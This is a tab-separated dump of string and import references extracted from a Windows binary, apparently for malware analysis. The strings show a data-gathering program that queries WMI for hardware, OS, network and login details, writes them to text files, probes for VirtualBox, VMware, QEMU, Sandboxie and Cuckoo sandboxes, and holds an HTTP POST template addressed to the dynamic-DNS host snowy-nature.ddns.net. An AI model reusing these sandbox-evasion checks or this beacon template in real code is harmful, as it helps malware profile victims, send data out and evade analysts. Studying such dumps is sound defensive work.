reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40150f	0x40d000	string	0x401509	libgcj-13.dll
0x401516	0x41240c	import	0x401509	KERNEL32.dll.GetModuleHandleA
0x401528	0x40d00e	string	0x401509	_Jv_RegisterClasses
0x401533	0x412410	import	0x401509	KERNEL32.dll.GetProcAddress
0x4015ca	0x40d024	string	0x4015bb	190009
0x4015d2	0x40d02b	string	0x4015bb	/config/setting.cgi
0x4015da	0x40d03f	string	0x4015bb	snowy-nature.ddns.net
0x4015e2	0x40d03f	string	0x4015bb	snowy-nature.ddns.net
0x4015ea	0x40d02b	string	0x4015bb	/config/setting.cgi
0x4015f2	0x40d058	string	0x4015bb	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x4018ac	0x40d0f2	string	0x40188f	XXX\nANNIE-DAEMON\n
0x4018ec	0x40d106	string	0x4018ba	.\Sagittarius.txt
0x4019a0	0x40d120	string	0x4018ba	<System up time>\nContinuous operation time: %lu msec.\n\n
0x4019ca	0x40d158	string	0x4018ba	<Sample path & meta data>
0x401ac4	0x40d173	string	0x4018ba	<Start up list>\n
0x401b96	0x40d184	string	0x4018ba	<Desktop customization>\n
0x401c4a	0x40d19d	string	0x4018ba	<File access history>\n
0x401d8f	0x40d106	string	0x4018ba	.\Sagittarius.txt
0x401e03	0x40d1b4	string	0x401dd0	DeviceId
0x401e3b	0x40d1c8	string	0x401dd0	PCI\VEN_80EE&DEV_CAFE
0x401e66	0x40d1f4	string	0x401e55	.\Scorpius.txt
0x401f1b	0x40d218	string	0x401e55	name
0x401f25	0x40d224	string	0x401e55	NumberOfFunctionKeys
0x401f2f	0x40d24e	string	0x401e55	Layout
0x401f43	0x40d218	string	0x401e55	name
0x401f4d	0x40d25c	string	0x401e55	Manufacturer
0x401f57	0x40d276	string	0x401e55	HardwareType
0x401f6b	0x40d290	string	0x401e55	CurrentVerticalResolution
0x401f75	0x40d2c4	string	0x401e55	CurrentHorizontalResolution
0x401f89	0x40d2fc	string	0x401e55	MonitorType
0x401f93	0x40d314	string	0x401e55	ScreenHeight
0x401f9d	0x40d32e	string	0x401e55	ScreenWidth
0x401fa7	0x40d348	string	0x401e55	MonitorManufacturer
0x401fbb	0x40d370	string	0x401e55	Name
0x401fc5	0x40d25c	string	0x401e55	Manufacturer
0x401fcf	0x40d37a	string	0x401e55	Product
0x401fd9	0x40d38a	string	0x401e55	Version
0x401fe3	0x40d39a	string	0x401e55	SerialNumber
0x401fed	0x40d25c	string	0x401e55	Manufacturer
0x401ff7	0x40d3b4	string	0x401e55	ReleaseDate
0x402001	0x40d3cc	string	0x401e55	SMBIOSBIOSVersion
0x40200b	0x40d3f0	string	0x401e55	InstallDate
0x402015	0x40d39a	string	0x401e55	SerialNumber
0x40201f	0x40d408	string	0x401e55	RegisteredUser
0x402029	0x40d426	string	0x401e55	Locale
0x402033	0x40d434	string	0x401e55	TimeGenerated
0x402054	0x40d450	string	0x401e55	<keyboard>\n
0x402079	0x40d45c	string	0x401e55	SELECT * FROM Win32_keyboard
0x402089	0x40d49e	string	0x401e55	ROOT\CIMV2
0x4020bf	0x40d4b4	string	0x401e55	<mouse>\n
0x4020e4	0x40d4c0	string	0x401e55	SELECT * FROM Win32_PointingDevice
0x4020f4	0x40d49e	string	0x401e55	ROOT\CIMV2
0x40212a	0x40d506	string	0x401e55	<video card>\n
0x40214f	0x40d514	string	0x401e55	SELECT * FROM Win32_VideoController
0x40215f	0x40d49e	string	0x401e55	ROOT\CIMV2
0x402195	0x40d55c	string	0x401e55	<desktop monitor>\n
0x4021ba	0x40d570	string	0x401e55	SELECT * FROM Win32_DesktopMonitor
0x4021ca	0x40d49e	string	0x401e55	ROOT\CIMV2
0x402200	0x40d5b6	string	0x401e55	<usb>\n
0x402225	0x40d5c0	string	0x401e55	SELECT * FROM Win32_PnPEntity WHERE DeviceID like 'USB'
0x402235	0x40d49e	string	0x401e55	ROOT\CIMV2
0x40226b	0x40d632	string	0x401e55	<mother board>\n
0x402290	0x40d644	string	0x401e55	SELECT * FROM Win32_BaseBoard
0x4022a0	0x40d49e	string	0x401e55	ROOT\CIMV2
0x4022d6	0x40d680	string	0x401e55	<bios>\n
0x4022fb	0x40d688	string	0x401e55	SELECT * FROM Win32_BIOS
0x40230b	0x40d49e	string	0x401e55	ROOT\CIMV2
0x402341	0x40d6ba	string	0x401e55	<os>\n
0x402366	0x40d6c0	string	0x401e55	SELECT * FROM Win32_OperatingSystem
0x402376	0x40d49e	string	0x401e55	ROOT\CIMV2
0x4023ac	0x40d708	string	0x401e55	<login history>\n
0x4023d1	0x40d71c	string	0x401e55	SELECT * FROM Win32_NTLogEvent WHERE logfile='system' And EventCode='6005'
0x4023e1	0x40d49e	string	0x401e55	ROOT\CIMV2
0x402417	0x40d7b2	string	0x401e55	<emulator detection>\n
0x40243a	0x40d7c8	string	0x401e55	[*] Detect by checking for VBox devices ...
0x40245a	0x40d7f8	string	0x401e55	root\cimv2
0x402482	0x40d80e	string	0x401e55	FALSE\n
0x40249c	0x40d818	string	0x401e55	SELECT DeviceId FROM Win32_PnPEntity
0x4024e2	0x40d862	string	0x401e55	TRUE\n
0x402507	0x40d80e	string	0x401e55	FALSE\n
0x40252a	0x40d868	string	0x401e55	[*] Detect by looking for VMware serial number ...
0x40254a	0x40d7f8	string	0x401e55	root\cimv2
0x402572	0x40d80e	string	0x401e55	FALSE\n
0x40258c	0x40d8a0	string	0x401e55	SELECT SerialNumber FROM Win32_Bios
0x4025d2	0x40d862	string	0x401e55	TRUE\n
0x4025f7	0x40d80e	string	0x401e55	FALSE\n
0x4026be	0x40d1f4	string	0x401e55	.\Scorpius.txt
0x40272f	0x40d39a	string	0x4026fc	SerialNumber
0x402767	0x40d8e8	string	0x4026fc	VMware
0x4027ac	0x40d8f6	string	0x402781	.\Circinus.txt
0x40286e	0x40d908	string	0x402781	<IP, MAC, Default Gateway, DNS>\n
0x40289c	0x40d929	string	0x402781	\n<Port List>\n
0x4028d5	0x40d937	string	0x402781	\n<ARP List>\n
0x4029a7	0x40d8f6	string	0x402781	.\Circinus.txt
0x402a10	0x40d944	string	0x4029e5	.\Aquarius.txt
0x402ad2	0x40d956	string	0x4029e5	<Application list>\n
0x402ae6	0x40d96a	string	0x4029e5	.exe
0x402b05	0x40d96f	string	0x4029e5	C:\Program Files
0x402bcc	0x40d944	string	0x4029e5	.\Aquarius.txt
0x402c35	0x40d980	string	0x402c0a	.\Orion.txt
0x402cf7	0x40d98f	string	0x402c0a	\n<OS product ID>\n
0x402d38	0x40d9a1	string	0x402c0a	<System manufacturer>\n
0x402d79	0x40d9b8	string	0x402c0a	<OS Version>\n
0x402dba	0x40d9c6	string	0x402c0a	<# Processors>\n
0x402dfb	0x40d9d6	string	0x402c0a	<Memory>\n
0x402e3c	0x40d9e0	string	0x402c0a	<Disk>\n
0x402e7d	0x40d9e8	string	0x402c0a	<# Icons of Desktop>\n
0x402ebe	0x40d9fe	string	0x402c0a	<System locale>\n
0x402eff	0x40da0f	string	0x402c0a	<Resolution>\n
0x402fd1	0x40d980	string	0x402c0a	.\Orion.txt
0x403163	0x40da1d	string	0x40312b	.\Pisces.txt
0x403225	0x40da30	string	0x40312b	Sandbox detected 'TRUE', undetected 'FALSE'\n\n
0x403248	0x40da5e	string	0x40312b	[-] Cuckoo detection\n
0x40326b	0x40da74	string	0x40312b	[*] Detect by cuckoo return address is stored in the TLS (hooks information structure) ...
0x403298	0x40d862	string	0x40312b	TRUE\n
0x4032bd	0x40d80e	string	0x40312b	FALSE\n
0x4032e0	0x40dad4	string	0x40312b	Cuckoo stores the return address in an extra space, allocated in the hook information structure FS: TLS_HOOK_INFO (Thread Local Storage)\n
0x403303	0x40db64	string	0x40312b	Therefor read the address of hook information and calculate the min and max value for the return address value location. Also FireEye use cuckoo https://github.com/David-Reguera-Garcia-Dreg/anticuckoo\n
0x403326	0x40dc33	string	0x40312b	[-] Qemu detection\n
0x403349	0x40dc48	string	0x40312b	[*] Reg key Scsi identifier is QEMU ...
0x403355	0x40dc73	string	0x40312b	QEMU
0x40335d	0x40dc78	string	0x40312b	Identifier
0x403365	0x40dc84	string	0x40312b	HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0
0x40337d	0x40dcd1	string	0x40312b	TRUE
0x4033a2	0x40d80e	string	0x40312b	FALSE\n
0x4033c5	0x40dcd8	string	0x40312b	[*] Reg key (HKLM\HARDWARE\Description\System "SystemBiosVersion") is QEMU ...
0x4033d1	0x40dc73	string	0x40312b	QEMU
0x4033d9	0x40dd2a	string	0x40312b	SystemBiosVersion
0x4033e1	0x40dd3c	string	0x40312b	HARDWARE\Description\System
0x4033f9	0x40dcd1	string	0x40312b	TRUE
0x40341e	0x40d80e	string	0x40312b	FALSE\n
0x403441	0x40dd58	string	0x40312b	[-] Sandboxie detection\n
0x403464	0x40dd74	string	0x40312b	[*] Using GetModuleHandle() to search sbiedll.dll ...
0x403470	0x40ddad	string	0x40312b	sbiedll.dll
0x40349c	0x40d862	string	0x40312b	TRUE\n
0x4034c1	0x40d80e	string	0x40312b	FALSE\n
0x4034e4	0x40ddb9	string	0x40312b	[-] VBox detection\n
0x403507	0x40ddd0	string	0x40312b	[*] Reg key Scsi identifier is VBOX ...
0x403513	0x40ddfb	string	0x40312b	VBOX
0x40351b	0x40dc78	string	0x40312b	Identifier
0x403523	0x40dc84	string	0x40312b	HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0
0x403552	0x40d862	string	0x40312b	TRUE\n
0x403577	0x40d80e	string	0x40312b	FALSE\n
0x40359a	0x40de00	string	0x40312b	[*] Reg key (HKLM\HARDWARE\Description\System "SystemBiosVersion") is VBOX...
0x4035a6	0x40ddfb	string	0x40312b	VBOX
0x4035ae	0x40dd2a	string	0x40312b	SystemBiosVersion
0x4035b6	0x40dd3c	string	0x40312b	HARDWARE\Description\System
0x4035e5	0x40d862	string	0x40312b	TRUE\n
0x40360a	0x40d80e	string	0x40312b	FALSE\n
0x40362d	0x40de54	string	0x40312b	[*] Reg key (HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions) ...
0x403639	0x40de9c	string	0x40312b	SOFTWARE\Oracle\VirtualBox Guest Additions
0x403668	0x40d862	string	0x40312b	TRUE\n
0x40368d	0x40d80e	string	0x40312b	FALSE\n
0x4036b0	0x40dec8	string	0x40312b	[*] Reg key (HKLM\HARDWARE\Description\System "VideoBiosVersion") is VIRTUALBOX...
0x4036bc	0x40df1e	string	0x40312b	VIRTUALBOX
0x4036c4	0x40df29	string	0x40312b	VideoBiosVersion
0x4036cc	0x40dd3c	string	0x40312b	HARDWARE\Description\System
0x4036fb	0x40d862	string	0x40312b	TRUE\n
0x403720	0x40d80e	string	0x40312b	FALSE\n
0x403743	0x40df3c	string	0x40312b	[*] Reg key (HKLM\HARDWARE\ACPI\DSDT\VBOX__) ...
0x40374f	0x40df70	string	0x40312b	HARDWARE\ACPI\DSDT\VBOX__
0x40377e	0x40d862	string	0x40312b	TRUE\n
0x4037a3	0x40d80e	string	0x40312b	FALSE\n
0x4037c6	0x40df8c	string	0x40312b	[*] Reg key (HKLM\HARDWARE\ACPI\FADT\VBOX__) ...
0x4037d2	0x40dfc0	string	0x40312b	HARDWARE\ACPI\FADT\VBOX__
0x403801	0x40d862	string	0x40312b	TRUE\n
0x403826	0x40d80e	string	0x40312b	FALSE\n
0x403849	0x40dfdc	string	0x40312b	[*] Reg key (HKLM\HARDWARE\ACPI\RSDT\VBOX__) ...
0x403855	0x40e010	string	0x40312b	HARDWARE\ACPI\RSDT\VBOX__
0x403884	0x40d862	string	0x40312b	TRUE\n
0x4038a9	0x40d80e	string	0x40312b	FALSE\n
0x4038cc	0x40e02c	string	0x40312b	[*] Reg key (HKLM\SYSTEM\ControlSet001\Services\VBox* x5 ...
0x40392b	0x40e06c	string	0x40312b	SYSTEM\ControlSet001\Services\VBoxGuest
0x403934	0x40e094	string	0x40312b	SYSTEM\ControlSet001\Services\VBoxMouse
0x40393e	0x40e0bc	string	0x40312b	SYSTEM\ControlSet001\Services\VBoxService
0x403948	0x40e0e8	string	0x40312b	SYSTEM\ControlSet001\Services\VBoxSF
0x403952	0x40e110	string	0x40312b	SYSTEM\ControlSet001\Services\VBoxVideo
0x40398c	0x40e138	string	0x40312b	VirtualBox traced using Reg key HKLM\%s
0x4039da	0x40d862	string	0x40312b	TRUE\n
0x4039ff	0x40d80e	string	0x40312b	FALSE\n
0x403a22	0x40e160	string	0x40312b	[*] Reg key (HKLM\HARDWARE\DESCRIPTION\System "SystemBiosDate") is 06/23/99 ...
0x403a2e	0x40e1b3	string	0x40312b	06/23/99
0x403a36	0x40e1bc	string	0x40312b	SystemBiosDate
0x403a3e	0x40e1cb	string	0x40312b	HARDWARE\DESCRIPTION\System
0x403a6d	0x40d862	string	0x40312b	TRUE\n
0x403a92	0x40d80e	string	0x40312b	FALSE\n
0x403ab5	0x40e1e8	string	0x40312b	[*] Detect by driver files in C:\WINDOWS\system32\drivers\VBox* x4 ...
0x403b1f	0x40e234	string	0x40312b	C:\WINDOWS\system32\drivers\VBoxMouse.sys
